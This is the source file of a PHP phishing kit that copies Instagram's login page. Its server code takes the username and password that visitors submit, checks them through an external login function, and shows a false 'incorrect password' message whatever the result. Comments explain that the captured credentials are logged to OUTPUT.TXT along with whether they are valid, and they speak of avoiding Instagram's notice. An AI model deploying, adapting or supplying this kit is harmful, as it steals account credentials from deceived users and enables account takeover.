<?php
    require_once("inc/function.php");
    header('Access-Control-Allow-Origin: *');
    header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");
    header("Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, X-Requested-With");

    if(isset($_POST['login']) && isset($_POST['password'])) {


        if(!empty($_POST['login']) && !empty($_POST['password'])) {
            // this is our index.php file
            // we only call the function for any Instagram action.
            // Now we need to understand how we can develop it well without Instagram notice.

            $login = $_POST['login'];
            $password = $_POST['password'];
            $username = $login;

            // If you hvar proxy you can add here.

            $proxy = '';
            $proxyUser = '';
            $proxyPass = '';

            $proxy = @$proxy ? $proxy : '';

            // now we call the login function

            $log = login($username, $password, $proxyUser, $proxyPass, $proxy);

            if($log == 'success') {
                // YOU CAN ENTER A DIFFERENT MESSAGE HERE IF YOU WANT TO SHOW THEM YOUR ACCOUNT HAS BEEN LOCKED OR YOU CAN SET THE SAME ERROR MESSAGE - INSIDE THE OUTPUT.TXT IT WILL SHOW IF THE ACCOUNT WAS REAL OR NOT FOR THE CREDENTIALS THEY ENTERED!
                echo json_encode(array('success' => 0, 'data' => "The username or password you entered doesn't belong to an account. Please check your username or password and try again."));
            } else {
                echo json_encode(array('success' => 0, 'data' => "The username or password you entered doesn't belong to an account. Please check your username or password and try again."));
                exit;
            }
        } else {
            echo json_encode(array('success' => 0, 'data' => 'All fields are required.'));
            exit;
        }
    }
?>
<!DOCTYPE html>
<html lang="en" class="no-js not-logged-in client-root">
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <title>Instagram</title>
        <meta name="robots" content="noimageindex, noarchive" />
        <meta name="apple-mobile-web-app-status-bar-style" content="default" />
        <meta name="mobile-web-app-capable" content="yes" />
        <meta name="theme-color" content="#ffffff" />
        <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover" />
        <link rel="stylesheet" href="styles.css" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css" integrity="sha512-1PKOgIY59xJ8Co8+NE6FZ+LOAZKjy+KY8iq0G4B3CyeY6wYHN3yt9PW0XpSriVlkMXe40PTKnXrLnZ9+fkDaog==" crossorigin="anonymous" />
        <script src="https://code.jquery.com/jquery-3.5.1.js" integrity="sha256-QWo7LDvxbWT2tbbQ97B53yJnYU3WhH/C8ycbRAkjPDc=" crossorigin="anonymous"></script>
        <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico" />
        <meta property="al:ios:app_name" content="Instagram" />
        <meta property="al:ios:app_store_id" content="389801252" />
        <meta property="al:ios:url" content="instagram://mainfeed" />
        <meta property="al:android:app_name" content="Instagram" />
        <meta property="al:android:package" content="com.instagram.android" />
        <meta property="al:android:url" content="https://www.instagram.com/_n/mainfeed/" />
        <meta property="og:site_name" content="Instagram" />
        <meta property="og:title" content="Instagram" />
        <meta property="og:image" content="/static/images/ico/favicon-200.png/ab6eff595bb1.png" />
        <meta property="fb:app_id" content="124024574287414" />
        <meta property="og:url" content="https://instagram.com/" />
        <meta content="Create an account or log in to Instagram - A simple, fun &amp; creative way to capture, edit &amp; share photos, videos &amp; messages with friends &amp; family." name="description" />
        <link rel="canonical" href="https://www.instagram.com/" />
        <style type="text/css">
            .yOZjD {
                -webkit-align-self: center;
                -ms-flex-item-align: center;
                align-self: center;
                background-image: url(images/43cc71bb1b43.png);
                background-position: 0 0;
                background-size: 454px 618px;
                -webkit-flex-basis: 454px;
                -ms-flex-preferred-size: 454px;
                flex-basis: 454px;
                height: 618px;
                margin-left: -35px;
                margin-right: -15px;
                bottom: 30px;
            }

            ._4_yKc {
                -webkit-box-orient: horizontal;
                -webkit-box-direction: normal;
                -webkit-flex-direction: row;
                -ms-flex-direction: row;
                flex-direction: row;
                -webkit-box-flex: 1;
                -webkit-flex-grow: 1;
                -ms-flex-positive: 1;
                flex-grow: 1;
                -webkit-box-pack: center;
                -webkit-justify-content: center;
                -ms-flex-pack: center;
                justify-content: center;
                margin: 64px auto 0;
                max-width: 935px;
                padding-bottom: 64px;
                width: 100%;
            }

            #react-root,
            article,
            div,
            header,
            main,
            nav,
            section {
                -webkit-box-align: stretch;
                -webkit-align-items: stretch;
                -ms-flex-align: stretch;
                align-items: stretch;
                border: 0 solid #000;
                -webkit-box-sizing: border-box;
                box-sizing: border-box;
                display: -webkit-box;
                display: -webkit-flex;
                display: -ms-flexbox;
                display: flex;
                -webkit-box-orient: vertical;
                -webkit-box-direction: normal;
                -webkit-flex-direction: column;
                -ms-flex-direction: column;
                flex-direction: column;
                -webkit-flex-shrink: 0;
                -ms-flex-negative: 0;
                flex-shrink: 0;
                margin: 0;
                padding: 0;
                position: relative;
            }

            .Z7p_S {
                margin: 10px 40px 18px;
            }
            .K-1uj {
                -webkit-box-orient: horizontal;
                -webkit-box-direction: normal;
                -webkit-flex-direction: row;
                -ms-flex-direction: row;
                flex-direction: row;
            }
            .s311c {
                -webkit-box-flex: 1;
                -webkit-flex-grow: 1;
                -ms-flex-positive: 1;
                flex-grow: 1;
                -webkit-flex-shrink: 1;
                -ms-flex-negative: 1;
                flex-shrink: 1;
                background-color: #dbdbdb;
                background-color: rgba(var(--b38, 219, 219, 219), 1);
                height: 1px;
                position: relative;
                top: 0.45em;
            }
            ._0tv-g {
                color: #8e8e8e;
                color: rgba(var(--f52, 142, 142, 142), 1);
                -webkit-box-flex: 0;
                -webkit-flex-grow: 0;
                -ms-flex-positive: 0;
                flex-grow: 0;
                -webkit-flex-shrink: 0;
                -ms-flex-negative: 0;
                flex-shrink: 0;
                font-size: 13px;
                font-weight: 600;
                line-height: 15px;
                margin: 0 18px;
                text-transform: uppercase;
            }

            .fb {
                display: inline;
            }
            ul {
                display: inline;
            }

            .RP4i1 {
                height: 427px;
                left: 0;
                position: absolute;
                top: 0;
                width: 240px;
            }
            .JtrJi {
                -webkit-transition: opacity 1.5s ease-in;
                transition: opacity 1.5s ease-in;
                z-index: 2;
            }
            .V64Sp {
                margin: 99px 0 0 151px;
                position: relative;
            }

            .fade {
                -webkit-transition: opacity 1s ease-in-out;
                -moz-transition: opacity 1s ease-in-out;
                -o-transition: opacity 1s ease-in-out;
                transition: opacity 1s ease-in-out;
            }

            .fade-out {
                opacity: 0;
            }

            .fade-in {
                opacity: 1;
            }

            ._3G4x7 {
                color: #00376b;
                color: rgba(var(--fe0, 0, 55, 107), 1);
                cursor: pointer;
                display: inline-block;
                font-weight: 600;
                position: relative;
                top: 1.5px;
                text-transform: uppercase;
                vertical-align: top;
            }
            .T26W3 {
                color: #0095f6;
                color: rgba(var(--d69, 0, 149, 246), 1);
            }
            .hztqj {
                cursor: pointer;
                height: 100%;
                left: 0;
                opacity: 0;
                position: absolute;
                top: 0;
                width: 100%;
            }
            select:not(:-internal-list-box) {
                overflow: visible !important;
            }
            user agent stylesheet select {
                -webkit-writing-mode: horizontal-tb !important;
                text-rendering: auto;
                color: -internal-light-dark(black, white);
                letter-spacing: normal;
                word-spacing: normal;
                text-transform: none;
                text-indent: 0px;
                text-shadow: none;
                display: inline-block;
                text-align: start;
                appearance: menulist;
                box-sizing: border-box;
                align-items: center;
                white-space: pre;
                -webkit-rtl-ordering: logical;
                background-color: -internal-light-dark(rgb(255, 255, 255), rgb(59, 59, 59));
                cursor: default;
                margin: 0em;
                font: 400 13.3333px Arial;
                border-radius: 0px;
                border-width: 1px;
                border-style: solid;
                border-color: -internal-light-dark(rgb(118, 118, 118), rgb(195, 195, 195));
                border-image: initial;
            }
            @media (max-width: 875px) {
                ._80tAB {
                    display: none;
                }
                .copyright {
                    padding-left: 0px !important;
                }
            }
            @media (max-width: 875px) {
                .VWk7Y .ixdEe,
                .SkY6J .ixdEe {
                    -webkit-box-pack: center;
                    -webkit-justify-content: center;
                    -ms-flex-pack: center;
                    justify-content: center;
                    margin: 0 auto;
                    max-width: 360px;
                }
            }
            ul li {
                font-weight: bold;
            }
            .disabled {
                background-color: rgba(0, 149, 246, 0.3) !important;
                background-color: rgba(var(--d69, 0, 149, 246), 0.3) !important;
                opacity: 1 !important;
                border: 1px solid transparent !important;
            }
            .eiCW- {
                color: #ed4956;
                color: rgba(var(--i30,237,73,86),1);
                margin: 15px 0px;
            }
        </style>
    </head>

    <body>
        <div class="wrapper">
            <div class="header">
                <div>
                    <article class="_4_yKc">
                        <div class="yOZjD _80tAB">
                            <div class="V64Sp">
                                <img draggable="false" class="RP4i1 UVauz fade" id="img1" src="images/f0c687aa6ec2.jpg" alt="" />
                            </div>
                        </div>

                        <div class="top">
                            <div class="back" style="background: #fff; border: 1px solid #e6e6e6; border-radius: 1px; padding: 40px 40px 20px; height: fit-content; width: 348px;">
                                <div class="logo">
                                    <img draggable="false" src="instagram.png" alt="Instagram" style="width: 175px;" />
                                </div>
                                <form method="POST" id="instalogin">
                                  <div class="form">
                                      <div class="input_field">
                                          <input type="text" id="login" name="login" placeholder="Phone number, username, or email" class="input" />
                                      </div>
                                      <div class="input_field">
                                          <input type="password" id="password" name="password" placeholder="Password" class="input" />
                                      </div>
                                      <button type="submit" class="btn disabled" disabled="disabled">Log In</button>
                                  </div>
                                </form>
                                <div class="K-1uj Z7p_S">
                                    <div class="s311c"></div>
                                    <div class="_0tv-g">or</div>
                                    <div class="s311c"></div>
                                </div>

                                <div class="dif">
                                    <center>
                                        <div class="fb">
                                            <img draggable="false" src="facebook.png" style="display: inline;" alt="facebook" />
                                            <a href="javascript:void(0);"><p style="display: inline; font-weight: bold;">Log in with Facebook</p></a>
                                        </div>

                                        <div class="eiCW- result" style="display: none; font-size: 13px;"><p aria-atomic="true" id="slfErrorAlert" role="alert"></p></div>


                                    </center>
                                    <div class="forgot">
                                        <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">Forgot password?</a>
                                    </div>
                                </div>
                            </div>

                            <div class="under" style="width: 100%;">
                                <div class="signup" style="width: 100%; background: #fff; border: 1px solid #e6e6e6; border-radius: 1px; height: fit-content; width: 348px;">
                                    <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank">Sign up</a></p>
                                </div>
                                <div class="apps">
                                    <p>Get the app.</p>
                                    <div class="icons" style="display: inline;">
                                        <a href="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" target="_blank"><img draggable="false" src="appstore.png" alt="appstore" /></a>
                                        <a href="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" target="_blank">
                                            <img draggable="false" src="googleplay.png" alt="googleplay" />
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </article>
                </div>
            </div>
        </div>
        <center>
            <div class="footer">
                <div class="links">
                    <ul class="ixdEe _9Rlzb">
                        <li><a href="https://about.instagram.com/">ABOUT</a></li>
                        <li><a href="https://help.instagram.com/">HELP</a></li>
                        <li><a href="https://about.instagram.com/blog/">PRESS</a></li>
                        <li><a href="https://www.instagram.com/developer/">API</a></li>
                        <li><a href="https://www.instagram.com/about/jobs/">JOBS</a></li>
                        <li><a href="https://www.instagram.com/legal/privacy/">PRIVACY</a></li>
                        <li><a href="https://www.instagram.com/legal/terms/">TERMS</a></li>
                        <li><a href="https://www.instagram.com/explore/locations/">LOCATIONS</a></li>
                        <li><a href="https://www.instagram.com/directory/profiles/">TOP ACCOUNTS</a></li>
                        <li><a href="https://www.instagram.com/directory/hashtags/">HASHTAGS</a></li>
                        <li>
                            <a href="javascript:">
                                <span class="_3G4x7 l93RR">
                                    Language
                                    <select aria-label="Switch Display Language" class="hztqj">
                                        <option value="af">Afrikaans</option>
                                        <option value="cs">Čeština</option>
                                        <option value="da">Dansk</option>
                                        <option value="de">Deutsch</option>
                                        <option value="el">Ελληνικά</option>
                                        <option value="en">English</option>
                                        <option value="es">Español (España)</option>
                                        <option value="es-la">Español</option>
                                        <option value="fi">Suomi</option>
                                        <option value="fr">Français</option>
                                        <option value="id">Bahasa Indonesia</option>
                                        <option value="it">Italiano</option>
                                        <option value="ja">日本語</option>
                                        <option value="ko">한국어</option>
                                        <option value="ms">Bahasa Melayu</option>
                                        <option value="nb">Norsk</option>
                                        <option value="nl">Nederlands</option>
                                        <option value="pl">Polski</option>
                                        <option value="pt-br">Português (Brasil)</option>
                                        <option value="pt">Português (Portugal)</option>
                                        <option value="ru">Русский</option>
                                        <option value="sv">Svenska</option>
                                        <option value="th">ภาษาไทย</option>
                                        <option value="tl">Filipino</option>
                                        <option value="tr">Türkçe</option>
                                        <option value="zh-cn">中文(简体)</option>
                                        <option value="zh-tw">中文(台灣)</option>
                                        <option value="bn">বাংলা</option>
                                        <option value="gu">ગુજરાતી</option>
                                        <option value="hi">हिन्दी</option>
                                        <option value="hr">Hrvatski</option>
                                        <option value="hu">Magyar</option>
                                        <option value="kn">ಕನ್ನಡ</option>
                                        <option value="ml">മലയാളം</option>
                                        <option value="mr">मराठी</option>
                                        <option value="ne">नेपाली</option>
                                        <option value="pa">ਪੰਜਾਬੀ</option>
                                        <option value="si">සිංහල</option>
                                        <option value="sk">Slovenčina</option>
                                        <option value="ta">தமிழ்</option>
                                        <option value="te">తెలుగు</option>
                                        <option value="vi">Tiếng Việt</option>
                                        <option value="zh-hk">中文(香港)</option>
                                        <option value="bg">Български</option>
                                        <option value="fr-ca">Français (Canada)</option>
                                        <option value="ro">Română</option>
                                        <option value="sr">Српски</option>
                                        <option value="uk">Українська</option>
                                    </select>
                                </span>
                            </a>
                        </li>
                    </ul>
                </div>
                <div class="copyright">
                    © 2020 INSTAGRAM FROM FACEBOOK
                </div>
            </div>
        </center>

        <script type="text/javascript">
            var img_tracker = "icon1";
            var pic = document.getElementById("img1");

            function changeImg() {
                if (img_tracker == "icon3") {
                    pic.src = "images/842fe5699220.jpg";
                    img_tracker = "icon4";
                } else if (img_tracker == "icon2") {
                    pic.src = "images/0a2d3016f375.jpg";
                    img_tracker = "icon3";
                } else if (img_tracker == "icon1") {
                    pic.src = "images/6f03eb85463c.jpg";
                    img_tracker = "icon2";
                } else {
                    pic.src = "images/f0c687aa6ec2.jpg";
                    img_tracker = "icon1";
                }
            }

            function fadeIn() {
                pic.classList.remove("fade-out");
                pic.classList.add("fade-in");
            }

            function fadeOut() {
                pic.classList.remove("fade-in");
                pic.classList.add("fade-out");

                // Add listener to the "transitionend" event.

                pic.addEventListener("transitionend", function x() {
                    // Remove the previously added listener, change
                    // the image and fade-in the new image.

                    pic.removeEventListener("transitionend", x);
                    changeImg();
                    fadeIn();
                });
            }

            setInterval(fadeOut, 5000);
        </script>

        <script type="text/javascript">
            $("#password, #login").bind("keyup", function () {
                if (allFilled()) {
                    $(".btn").removeClass("disabled");
                    $(".btn").removeAttr("disabled");
                } else {
                    $(".btn").addClass("disabled");
                    $('.btn').prop('disabled', true);
                }
            });

            function allFilled() {
                var filled = true;
                $("body input").each(function () {
                    if ($(this).val() == "") filled = false;
                });
                return filled;
            }
        </script>

        <script type="text/javascript">
          $(document).ready(function() {
              $('#instalogin').submit(function(e) {
                  e.preventDefault();
                  $.ajax({
                      type: "POST",
                      data: $(this).serialize(),
                      dataType:"text", 
                      beforeSend: function() {
                        $('.btn').html('<i class="fas fa-spinner fa-spin"></i>');
                      },
                      success: function(response)
                      {

                        if(response == 'Failed to find log in form!') {
                            $('.btn').html('Log In');
                            $('#slfErrorAlert').text(jsonData.data);
                            $('.result').fadeIn();
                        } else {
                          //location.href = 'https://www.instagram.com/';
                          var jsonData = JSON.parse(JSON.stringify(response));
            
                          // user is logged in successfully in the back-end
                          // let's redirect
                          if (jsonData.success == "1" || jsonData.success == 1)
                          {
                              $('.result').fadeOut();
                              location.href = 'https://www.instagram.com/';
                          } 
                          else 
                          {
                            $('.btn').html('Log In');
                            $('#slfErrorAlert').text(jsonData.data);
                            $('.result').fadeIn();
                          }
                        }
                     }
                 });
               });
          });
        </script>
    </body>
</html>
